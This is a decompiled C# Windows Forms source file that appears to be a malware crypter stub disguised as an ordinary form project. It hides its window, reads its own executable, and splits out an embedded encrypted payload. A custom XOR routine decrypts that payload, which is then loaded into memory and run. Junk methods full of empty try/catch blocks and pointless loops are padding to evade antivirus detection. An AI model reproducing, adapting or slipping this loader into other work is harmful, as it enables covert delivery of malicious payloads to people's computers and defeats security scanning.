using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace project2;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("ColorDialog1")]
	private ColorDialog _ColorDialog1;

	[AccessedThroughProperty("CheckedListBox1")]
	private CheckedListBox _CheckedListBox1;

	[AccessedThroughProperty("DomainUpDown1")]
	private DomainUpDown _DomainUpDown1;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual ColorDialog ColorDialog1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColorDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColorDialog1 = value;
		}
	}

	internal virtual CheckedListBox CheckedListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckedListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckedListBox1 = value;
		}
	}

	internal virtual DomainUpDown DomainUpDown1
	{
		[DebuggerNonUserCode]
		get
		{
			return _DomainUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_DomainUpDown1 = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		Button1 = new Button();
		ColorDialog1 = new ColorDialog();
		CheckedListBox1 = new CheckedListBox();
		DomainUpDown1 = new DomainUpDown();
		GroupBox1 = new GroupBox();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(192, 40);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(131, 76);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("RT");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ListControl)CheckedListBox1).set_FormattingEnabled(true);
		CheckedListBox checkedListBox = CheckedListBox1;
		location = new Point(30, 186);
		((Control)checkedListBox).set_Location(location);
		((Control)CheckedListBox1).set_Name("CheckedListBox1");
		CheckedListBox checkedListBox2 = CheckedListBox1;
		size = new Size(73, 19);
		((Control)checkedListBox2).set_Size(size);
		((Control)CheckedListBox1).set_TabIndex(1);
		DomainUpDown domainUpDown = DomainUpDown1;
		location = new Point(117, 253);
		((Control)domainUpDown).set_Location(location);
		((Control)DomainUpDown1).set_Name("DomainUpDown1");
		DomainUpDown domainUpDown2 = DomainUpDown1;
		size = new Size(88, 20);
		((Control)domainUpDown2).set_Size(size);
		((Control)DomainUpDown1).set_TabIndex(2);
		((UpDownBase)DomainUpDown1).set_Text("DomainUpDown1");
		GroupBox groupBox = GroupBox1;
		location = new Point(148, 135);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(130, 85);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(3);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("G1");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(124, 6);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)DomainUpDown1);
		((Control)this).get_Controls().Add((Control)(object)CheckedListBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Fo");
		((Control)this).ResumeLayout(false);
	}

	public void _J8D61cX2l4()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(871253420L);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(908905031L);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			try
			{
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static byte[] RkZk6hd(string F7uY0sPQ)
	{
		return Encoding.Default.GetBytes(F7uY0sPQ);
	}

	public void _An5Ed()
	{
		while (true)
		{
		}
	}

	public string No148BX(byte[] CM1R2Z)
	{
		return Encoding.Default.GetString(CM1R2Z);
	}

	public void _KpSTZNOTjYgt33Y3K4()
	{
		new decimal(-1379390905L);
		double num = 0.2815034;
		double num2;
		double num3;
		do
		{
			num += 1.0;
			num2 = num;
			num3 = 0.5033712;
		}
		while (num2 <= num3);
		new decimal(-1743547761L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		num3 = 0.05026281;
		double num4 = 0.1877751;
		double num5;
		do
		{
			num4 += 1.0;
			num5 = num4;
			num3 = 0.8966166;
		}
		while (num5 <= num3);
		new decimal(887359331L);
		while (true)
		{
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string[] array = Strings.Split(No148BX(File.ReadAllBytes(Application.get_ExecutablePath())), "@A@", -1, (CompareMethod)0);
		Assembly asm = AppDomain.CurrentDomain.Load(kYz3oGv(RkZk6hd(array[1]), array[3]));
		dix(asm);
	}

	public void _Z2IvMNTlZB6rq()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		double num = 0.4713914;
		while (true)
		{
			double num2 = num;
			double num3 = 0.004019678;
			if (!(num2 > num3))
			{
				try
				{
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					new decimal(-1965897330L);
					new decimal(215144614L);
					new decimal(909568593L);
					ProjectData.ClearProjectError();
				}
				try
				{
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					new decimal(1324969197L);
					ProjectData.ClearProjectError();
				}
				num += 1.0;
				continue;
			}
			break;
		}
		while (true)
		{
		}
	}

	public byte[] kYz3oGv(byte[] l7gNZvEW, string I8wD1k)
	{
		byte[] array = RkZk6hd(I8wD1k);
		checked
		{
			for (int i = l7gNZvEW.Length * 2 + array.Length; i >= 0; i += -1)
			{
				int num = unchecked(l7gNZvEW[i % l7gNZvEW.Length] ^ array[i % array.Length]);
				l7gNZvEW[unchecked(i % l7gNZvEW.Length)] = (byte)unchecked(checked(num - unchecked((int)l7gNZvEW[checked(i + 1) % l7gNZvEW.Length]) + 256) % 256);
			}
			return l7gNZvEW;
		}
	}

	public void _Y766Q75()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		double num = 0.4010364;
		double num2;
		double num3;
		do
		{
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			num += 1.0;
			num2 = num;
			num3 = 0.8414276;
		}
		while (num2 <= num3);
		new decimal(-460906053L);
		double num4 = 0.5081666;
		double num5;
		do
		{
			new decimal(926329912L);
			num4 += 1.0;
			num5 = num4;
			num3 = 0.7935967;
		}
		while (num5 <= num3);
		new decimal(1589981404L);
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		double num6 = 0.5484239;
		double num7;
		do
		{
			try
			{
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			num6 += 1.0;
			num7 = num6;
			num3 = 0.5584448;
		}
		while (num7 <= num3);
		try
		{
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			new decimal(1489285171L);
			ProjectData.ClearProjectError();
		}
	}

	public void dix(Assembly asm)
	{
		Activator.CreateInstance(asm.GetTypes()[0]);
	}
}
